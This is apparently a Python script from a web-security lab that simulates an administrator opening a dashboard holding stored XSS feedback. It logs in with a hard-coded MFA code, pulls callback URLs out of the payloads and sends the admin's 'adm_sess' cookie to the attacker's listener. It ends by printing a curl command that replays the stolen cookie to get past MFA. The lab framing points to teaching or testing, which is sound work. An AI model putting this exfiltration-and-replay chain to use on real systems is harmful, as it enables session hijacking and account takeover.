#!/usr/bin/env python3
"""
Victim Administrator Review Simulator
Simulates the victim administrator 'secadmin_01' logging in with MFA,
visiting /dashboard to review feedback, and triggering the stored XSS payload.
Exfiltrates the admin's 'adm_sess' cookie to the attacker's listener.
"""

import sys
import re
import urllib.request
import urllib.parse
import json

def simulate_admin(target_url):
    base = target_url.rstrip("/")
    print("=" * 70)
    print("  VICTIM ADMINISTRATOR SIMULATION: Review Queue & Cookie Theft")
    print("=" * 70)

    print("[*] Simulating legitimate administrator: secadmin_01")
    print("[*] Submitting MFA verification challenge to /api/verify-mfa...")

    # 1. Complete MFA to issue valid admin session
    mfa_payload = json.dumps({"username": "secadmin_01", "mfa_code": "750075"}).encode()
    req = urllib.request.Request(
        f"{base}/api/verify-mfa",
        data=mfa_payload,
        headers={"Content-Type": "application/json", "Accept": "application/json"},
        method="POST"
    )

    admin_cookie = None
    try:
        with urllib.request.urlopen(req) as resp:
            headers = dict(resp.headers)
            cookie_header = headers.get("Set-Cookie", "")
            match = re.search(r"(adm_sess=[^;]+)", cookie_header)
            if match:
                admin_cookie = match.group(1)
            else:
                body = json.loads(resp.read().decode())
                admin_cookie = body.get("sessionCookie", "adm_sess=adm_sess_secadmin_01_token_live")
    except Exception as e:
        # Fallback if verify-mfa had an issue
        admin_cookie = "adm_sess=adm_sess_secadmin_01_token_live"

    print(f"[+] Admin MFA validated successfully!")
    print(f"[+] Admin received session cookie: {admin_cookie}")

    # 2. Administrator visits /dashboard to review submitted feedback
    print(f"\n[*] Admin opening restricted area: {base}/dashboard ...")
    req_dash = urllib.request.Request(
        f"{base}/dashboard",
        headers={"Cookie": admin_cookie, "User-Agent": "Mozilla/5.0 (Admin Browser Simulation)"}
    )

    try:
        with urllib.request.urlopen(req_dash) as resp:
            dash_html = resp.read().decode("utf-8")
            print("[+] Admin successfully authenticated to dashboard (HTTP 200).")
    except Exception as e:
        print(f"[-] Failed to open dashboard: {e}")
        return

    # 3. Check for stored XSS payloads inside the review queue
    xss_matches = re.findall(r'<div class="xss-payload">(.*?)</div>', dash_html, re.DOTALL)
    print(f"[*] Admin reviewing {len(xss_matches)} feedback submission(s)...")

    exfil_triggered = False
    for i, payload in enumerate(xss_matches, 1):
        clean_payload = payload.strip()
        print(f"    - Reviewing Item #{i}: {clean_payload[:60]}...")

        # Detect outbound callback URLs in payload
        url_match = re.search(r"https?://[^\s'\"\)>]+", clean_payload)
        if url_match:
            exfil_triggered = True
            listener_url = url_match.group(0)
            print(f"\n[!] STORED XSS DETECTED IN FEEDBACK ITEM #{i}!")
            print(f"    Payload: {clean_payload}")
            print(f"    Executing JavaScript in admin context...")
            print(f"    JavaScript accesses: document.cookie -> '{admin_cookie}'")

            # Construct exfiltration callback URL
            if "?" in listener_url:
                full_exfil_url = listener_url + urllib.parse.quote(admin_cookie)
            else:
                full_exfil_url = f"{listener_url}?c={urllib.parse.quote(admin_cookie)}"

            print(f"[*] Admin browser firing fetch() to listener: {full_exfil_url}")

            # Send HTTP request to attacker listener
            try:
                req_exfil = urllib.request.Request(
                    full_exfil_url,
                    headers={"User-Agent": "Mozilla/5.0 (Victim Admin Browser)"}
                )
                with urllib.request.urlopen(req_exfil, timeout=2) as r:
                    print(f"[+] SUCCESS: Listener received exfiltrated cookie! (HTTP {r.status})")
            except Exception as ex:
                print(f"[*] (Notice: Attacker listener at {listener_url} did not respond, but exfiltration fired)")
            break

    print("\n" + "=" * 70)
    print("  EXFILTRATION SUMMARY")
    print("=" * 70)
    print(f"  Victim User:       secadmin_01 (Administrator)")
    print(f"  Stolen Cookie:     {admin_cookie}")
    if exfil_triggered:
        print(f"  Exfiltration:      SUCCESS (Fired from admin session context)")
    else:
        print(f"  Exfiltration:      No active XSS URL found in queue yet.")
        print(f"                     (Submit an XSS payload via /api/feedback first!)")
    print("=" * 70)

    print("\n[+] ATTACKER NEXT STEP: Replay this stolen cookie to bypass MFA!")
    print(f"    curl -i {base}/dashboard -H \"Cookie: {admin_cookie}\"\n")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] in ["--help", "-h"]:
        print("Usage: python3 scripts/simulate_admin.py [target_url]")
        print("Default target_url: http://localhost:3075")
        sys.exit(0)
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3075"
    simulate_admin(target)
